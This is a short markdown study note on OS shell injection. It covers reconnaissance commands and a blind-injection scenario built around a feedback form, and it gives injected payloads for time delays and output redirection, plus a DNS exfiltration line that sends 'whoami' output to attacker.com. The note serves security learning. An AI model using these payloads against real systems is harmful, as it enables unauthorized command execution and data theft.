# Shell Injection
- Shell injection allows attackers to execute operating system (OS) commands on the server running an application.
## Useful Commands
|Purpose of Command|Linux|Windows| 	
|:----:|:----:|:----:| 
|Name of current user|whoami|whoami| 	
|Operating system|uname -a|ver| 	
|Network configuration|ifconfig|ipconfig /all| 	
|Network connections |netstat -an|netstat -an| 	
|Running processes|ps -ef|tasklist| 	

## Blind OS Command Injection Vulnerabilities
- In blind OS command injection, the application does not return the output from the command within its HTTP response.
### Scenario
- Consider a website that lets users submit feedback. The user enters their email address and feedback message. The server-side application then generates an email to a site administrator containing the feedback. To do this, it calls out to the mail program with the submitted details:
```shell
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```
The output from the mail command (if any) is not returned in the application's responses.

### Techniques to Detect and Exploit Vulnerabilities
#### Using Time Delays: 
- Injecting commands that introduce a delay can help confirm the presence of a vulnerability. For example:
```shell
; sleep 10;
```
#### Exploiting by Redirecting Output: 
- Redirecting the output of a command to a file or another location can help capture the results. For example:
```shell
; ls > /tmp/output.txt;
```
#### Exploiting Out-of-Band Application Security Testing (OAST) Techniques: 
- Using external systems to capture the output of injected commands. For example, using DNS exfiltration:
```shell
; nslookup `whoami`.attacker.com;
```
